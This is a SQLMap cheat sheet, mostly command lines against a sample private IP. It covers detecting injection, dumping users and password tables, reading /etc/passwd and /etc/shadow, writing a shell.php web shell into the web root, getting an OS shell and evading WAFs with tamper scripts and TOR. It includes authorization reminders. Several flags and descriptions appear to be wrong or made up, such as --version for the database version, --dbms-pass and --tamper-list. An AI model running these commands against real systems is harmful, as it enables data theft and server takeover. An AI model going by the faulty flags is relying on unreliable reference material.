# SQLMap Cheat Sheet

## Overview

SQLMap is an open-source penetration testing tool used for:

- Detecting SQL injection vulnerabilities.
- Exploiting SQL injection flaws.
- Taking over database servers.
- Dumping database contents.
- Conducting authorized security assessments.

SQLMap provides:

- Automatic detection of SQL injection techniques.
- Support for multiple database management systems.
- Data extraction capabilities.
- File read/write operations.
- Command execution on the database server.

```text
Use SQLMap only against systems you own or are explicitly authorized to test.
```

---

# 1. Starting SQLMap

## Basic syntax

```bash
sqlmap [options]
```

## Show help

```bash
sqlmap -h
```

## Show version

```bash
sqlmap --version
```

## Show verbose help

```bash
sqlmap -hh
```

## Update SQLMap

```bash
sqlmap --update
```

Updates to the latest version from the repository.

---

# 2. Target Specification

## Specify target URL

```bash
sqlmap -u <URL>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/vuln.php?id=1"
```

## Specify target URL with parameters

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1&name=test"
```

## Specify POST request

```bash
sqlmap -u <URL> --data <POST-data>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Specify cookie

```bash
sqlmap -u <URL> --cookie <cookie>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"
```

## Specify User-Agent

```bash
sqlmap -u <URL> --user-agent <agent>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --user-agent "Mozilla/5.0"
```

## Specify HTTP headers

```bash
sqlmap -u <URL> --headers <headers>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php" --headers "X-Forwarded-For: 127.0.0.1"
```

## Specify proxy

```bash
sqlmap -u <URL> --proxy <proxy>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --proxy "http://127.0.0.1:8080"
```

## Specify proxy credentials

```bash
sqlmap -u <URL> --proxy <proxy> --proxy-cred <credentials>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php" --proxy "http://127.0.0.1:8080" --proxy-cred "user:pass"
```

## Specify TOR proxy

```bash
sqlmap -u <URL> --tor
```

## Specify request file

```bash
sqlmap -r <request-file>
```

Example:

```bash
sqlmap -r request.txt
```

## Specify multiple targets

```bash
sqlmap -m <targets-file>
```

Where `targets.txt` contains one URL per line.

---

# 3. Injection Detection

## Test for SQL injection

```bash
sqlmap -u <URL>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## Test specific parameter

```bash
sqlmap -u <URL> -p <parameter>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1&name=test" -p id
```

## Test all parameters

```bash
sqlmap -u <URL> --test-skip <parameter>
```

Skip specific parameters during testing.

## Specify injection technique

Techniques include:

- `B` - Boolean-based blind
- `E` - Error-based
- `U` - UNION query
- `S` - Stacked queries
- `T` - Time-based blind
- `Q` - Inline queries

```bash
sqlmap -u <URL> --technique <techniques>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --technique BEU
```

## Specify risk level

Levels 1-3 (default is 1):

- 1 - Basic tests
- 2 - Add time-based tests
- 3 - Add OR-based tests

```bash
sqlmap -u <URL> --risk <level>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --risk 2
```

## Specify level of tests

Levels 1-5 (default is 1):

- Higher levels test more parameters and cookies

```bash
sqlmap -u <URL> --level <level>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --level 3
```

## Skip WAF/IPS protection

```bash
sqlmap -u <URL> --skip-waf
```

## Use tamper scripts

```bash
sqlmap -u <URL> --tamper <script>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

---

# 4. Database Enumeration

## List all databases

```bash
sqlmap -u <URL> --dbs
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## List tables in current database

```bash
sqlmap -u <URL> --tables
```

## List tables in specific database

```bash
sqlmap -u <URL> -D <database> --tables
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb --tables
```

## List columns in specific table

```bash
sqlmap -u <URL> -D <database> -T <table> --columns
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --columns
```

## Dump specific table

```bash
sqlmap -u <URL> -D <database> -T <table> --dump
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Dump all tables

```bash
sqlmap -u <URL> -D <database> --dump-all
```

## Dump specific columns

```bash
sqlmap -u <URL> -D <database> -T <table> -C <columns> --dump
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users -C username,password --dump
```

## Count entries in table

```bash
sqlmap -u <URL> -D <database> -T <table> --count
```

## Get database schema

```bash
sqlmap -u <URL> --schema
```

## Get schema for specific database

```bash
sqlmap -u <URL> -D <database> --schema
```

---

# 5. User and Privilege Enumeration

## List database users

```bash
sqlmap -u <URL> --users
```

## List user privileges

```bash
sqlmap -u <URL> --privileges
```

## List privileges for specific user

```bash
sqlmap -u <URL> --privileges -U <username>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --privileges -U root
```

## List passwords for users

```bash
sqlmap -u <URL> --passwords
```

## Get current user

```bash
sqlmap -u <URL> --current-user
```

## Get current database

```bash
sqlmap -u <URL> --current-db
```

## Check if user is DBA

```bash
sqlmap -u <URL> --is-dba
```

## List roles

```bash
sqlmap -u <URL> --roles
```

---

# 6. Database System Information

## Get database banner

```bash
sqlmap -u <URL> --banner
```

## Get database server hostname

```bash
sqlmap -u <URL> --hostname
```

## Get database server IP address

```bash
sqlmap -u <URL> --dns-name
```

## Get database server version

```bash
sqlmap -u <URL> --version
```

## Get database server OS

```bash
sqlmap -u <URL> --os
```

## Get database server data directory

```bash
sqlmap -u <URL> --data-dir
```

---

# 7. File Operations

## Read file from database server

```bash
sqlmap -u <URL> --file-read <remote-path>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"
```

## Write file to database server

```bash
sqlmap -u <URL> --file-write <local-path> --file-dest <remote-path>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
```

## Read multiple files

```bash
sqlmap -u <URL> --file-read "/etc/passwd,/etc/shadow"
```

---

# 8. Command Execution

## Execute OS command

```bash
sqlmap -u <URL> --os-cmd <command>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Execute OS command with output

```bash
sqlmap -u <URL> --os-cmd "id"
```

## Get OS shell

```bash
sqlmap -u <URL> --os-shell
```

Provides an interactive shell on the database server.

## Get SQL shell

```bash
sqlmap -u <URL> --sql-shell
```

Provides an interactive SQL shell.

## Execute PowerShell command

```bash
sqlmap -u <URL> --os-cmd <powershell-command>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "powershell -c Get-Process"
```

---

# 9. Advanced Options

## Specify database management system

```bash
sqlmap -u <URL> --dbms <dbms>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbms mysql
```

Supported DBMS:

- MySQL
- PostgreSQL
- Oracle
- Microsoft SQL Server
- SQLite
- Microsoft Access
- IBM DB2
- SAP MaxDB
- Sybase
- Firebird

## Specify database user

```bash
sqlmap -u <URL> --dbms-user <username>
```

## Specify database password

```bash
sqlmap -u <URL> --dbms-pass <password>
```

## Specify database port

```bash
sqlmap -u <URL> --dbms-port <port>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbms-port 3306
```

## Specify connection string

```bash
sqlmap -u <URL> --connection-string <string>
```

## Limit number of entries

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --start <start> --stop <stop>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump --start 1 --stop 10
```

## First entry to retrieve

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --first <entry>
```

## Last entry to retrieve

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --last <entry>
```

## Exclude columns from dump

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --exclude-columns <columns>
```

## Search for specific databases

```bash
sqlmap -u <URL> --dbs --search
```

## Search for specific tables

```bash
sqlmap -u <URL> --tables --search
```

## Search for specific columns

```bash
sqlmap -u <URL> --columns --search
```

---

# 10. Output and Logging

## Save output to file

```bash
sqlmap -u <URL> -o
```

## Specify output directory

```bash
sqlmap -u <URL> --output-dir <directory>
```

## Verbose output

Levels 0-6 (default is 1):

```bash
sqlmap -u <URL> -v <level>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -v 3
```

## Show traffic

```bash
sqlmap -u <URL> --traffic
```

## Show HTTP requests

```bash
sqlmap -u <URL> --show-requests
```

## Parse targets from Burp proxy log

```bash
sqlmap -u <URL> --log-file <burp-log>
```

## Flush session file

```bash
sqlmap -u <URL> --flush-session
```

## Save session

```bash
sqlmap -u <URL> --save-config <config-file>
```

## Load session

```bash
sqlmap -u <URL> --load-config <config-file>
```

---

# 11. Common Attack Scenarios

## Basic SQL injection test

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## Enumerate databases

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## Dump users table

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Get database banner

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --banner
```

## Execute OS command

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Read /etc/passwd

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"
```

## Get OS shell

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

## POST injection

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Cookie injection

```bash
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"
```

## Header injection

```bash
sqlmap -u "http://192.168.1.10/page.php" --headers "X-Forwarded-For: 127.0.0.1"
```

## TOR proxy

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tor
```

## Use tamper script

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

---

# 12. Practical Workflows

## Basic SQL injection workflow

```text
1. Identify the target URL with parameters.
2. Test for SQL injection with SQLMap.
3. Enumerate databases.
4. Enumerate tables in target database.
5. Enumerate columns in target table.
6. Dump table contents.
7. Document findings.
```

## Example: Full enumeration

```bash
# Test for SQL injection
sqlmap -u "http://192.168.1.10/page.php?id=1"

# List databases
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs

# List tables in database
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb --tables

# List columns in table
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --columns

# Dump table
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Example: POST injection

```bash
# Test POST parameters
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"

# Enumerate databases
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test" --dbs

# Dump users table
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test" -D testdb -T users --dump
```

## Example: Cookie injection

```bash
# Test cookie parameter
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"

# Enumerate databases
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123" --dbs
```

## Example: File operations

```bash
# Read file from server
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"

# Write file to server
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
```

## Example: Command execution

```bash
# Execute command
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"

# Get OS shell
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

---

# 13. Common Commands Reference

| Command | Description |
|---|---|
| `sqlmap -h` | Show help |
| `sqlmap --version` | Show version |
| `sqlmap -u <URL>` | Specify target URL |
| `sqlmap -r <file>` | Specify request file |
| `sqlmap --data <data>` | Specify POST data |
| `sqlmap --cookie <cookie>` | Specify cookie |
| `sqlmap --dbs` | List all databases |
| `sqlmap --tables` | List tables |
| `sqlmap --columns` | List columns |
| `sqlmap --dump` | Dump table contents |
| `sqlmap --banner` | Get database banner |
| `sqlmap --current-user` | Get current user |
| `sqlmap --current-db` | Get current database |
| `sqlmap --users` | List database users |
| `sqlmap --passwords` | List passwords |
| `sqlmap --privileges` | List privileges |
| `sqlmap --file-read <path>` | Read file from server |
| `sqlmap --file-write <file>` | Write file to server |
| `sqlmap --os-cmd <cmd>` | Execute OS command |
| `sqlmap --os-shell` | Get OS shell |
| `sqlmap --sql-shell` | Get SQL shell |
| `sqlmap --tamper <script>` | Use tamper script |
| `sqlmap --tor` | Use TOR proxy |
| `sqlmap --proxy <proxy>` | Use proxy |
| `sqlmap -v <level>` | Set verbosity level |
| `sqlmap --level <level>` | Set test level |
| `sqlmap --risk <level>` | Set risk level |
| `sqlmap --technique <tech>` | Set injection technique |
| `sqlmap --dbms <dbms>` | Specify DBMS |
| `sqlmap --update` | Update SQLMap |

---

# 14. Tamper Scripts

## List available tamper scripts

```bash
sqlmap --tamper-list
```

## Common tamper scripts

- `space2comment` - Replaces space with `/**/`
- `space2dash` - Replaces space with `--`
- `space2hash` - Replaces space with `#`
- `space2plus` - Replaces space with `+`
- `space2randomblank` - Replaces space with random blank
- `between` - Replaces `>` with `NOT BETWEEN 0 AND #`
- `charencode` - URL-encodes all characters
- `equaltolike` - Replaces `=` with `LIKE`
- `lowercase` - Converts to lowercase
- `uppercase` - Converts to uppercase
- `randomcase` - Randomizes case
- `base64encode` - Base64 encodes payload

## Use tamper script

```bash
sqlmap -u <URL> --tamper <script>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

## Use multiple tamper scripts

```bash
sqlmap -u <URL> --tamper <script1>,<script2>
```

Example:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment,base64encode
```

---

# 15. Database-Specific Options

## MySQL

```bash
sqlmap -u <URL> --dbms mysql
```

## PostgreSQL

```bash
sqlmap -u <URL> --dbms postgresql
```

## Oracle

```bash
sqlmap -u <URL> --dbms oracle
```

## Microsoft SQL Server

```bash
sqlmap -u <URL> --dbms mssql
```

## SQLite

```bash
sqlmap -u <URL> --dbms sqlite
```

## Microsoft Access

```bash
sqlmap -u <URL> --dbms access
```

## IBM DB2

```bash
sqlmap -u <URL> --dbms db2
```

## SAP MaxDB

```bash
sqlmap -u <URL> --dbms maxdb
```

## Sybase

```bash
sqlmap -u <URL> --dbms sybase
```

## Firebird

```bash
sqlmap -u <URL> --dbms firebird
```

---

# 16. Troubleshooting

## No SQL injection detected

- Try different parameters.
- Increase level: `--level 3`
- Increase risk: `--risk 2`
- Use tamper scripts.
- Test manually with different payloads.

## WAF/IPS blocking

- Use tamper scripts.
- Use `--skip-waf`.
- Use proxy or TOR.
- Slow down requests: `--delay 1`
- Use random User-Agent: `--random-agent`

## Slow performance

- Reduce level: `--level 1`
- Reduce risk: `--risk 1`
- Limit entries: `--start 1 --stop 10`
- Use specific techniques: `--technique B`

## Connection errors

- Check target URL.
- Verify network connectivity.
- Check proxy settings.
- Increase timeout: `--timeout 30`

## False positives

- Verify injection manually.
- Use different techniques.
- Check response codes.
- Review SQLMap output carefully.

---

# 17. Security Best Practices

## Always verify findings

- Test injection manually.
- Verify database contents.
- Check for false positives.
- Document all findings.

## Respect legal boundaries

- Only test systems you own.
- Obtain explicit authorization.
- Follow responsible disclosure.
- Document all activities.

## Maintain a lab environment

- Use virtual machines.
- Isolate test networks.
- Keep clean snapshots.
- Document configurations.

## Keep tools updated

- Update SQLMap regularly.
- Stay informed about new techniques.
- Follow security advisories.
- Test in controlled environments.

## Minimize impact

- Use lowest risk level possible.
- Limit data extraction.
- Avoid destructive operations.
- Test during maintenance windows.

---

# 18. Important Reminders

- Always obtain explicit authorization before using SQLMap.
- Test in a controlled lab environment first.
- Not all detected injections are exploitable.
- Some operations may impact database performance.
- Keep SQLMap updated regularly.
- Validate findings manually; do not rely solely on automated results.
- Document all actions, commands, and results.
- Preserve original evidence and logs.
- Respect the scope and rules of engagement.
- Understand the legal and ethical implications of your actions.

---

# 19. Quick Reference Examples

## Basic test

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## List databases

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## List tables

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tables
```

## Dump table

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Get banner

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --banner
```

## Execute command

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Get OS shell

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

## POST injection

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Use tamper

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

## Use TOR

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tor
```

## Verbose output

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -v 3
```

## High level test

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --level 3 --risk 2
```

---

# 20. Additional Resources

## SQLMap Official Documentation

```text
https://sqlmap.org/
```

## SQLMap GitHub Repository

```text
https://github.com/sqlmapproject/sqlmap
```

## SQLMap Wiki

```text
https://github.com/sqlmapproject/sqlmap/wiki
```

## OWASP SQL Injection

```text
https://owasp.org/www-community/attacks/SQL_Injection
```

## PortSwigger SQL Injection

```text
https://portswigger.net/web-security/sql-injection
```
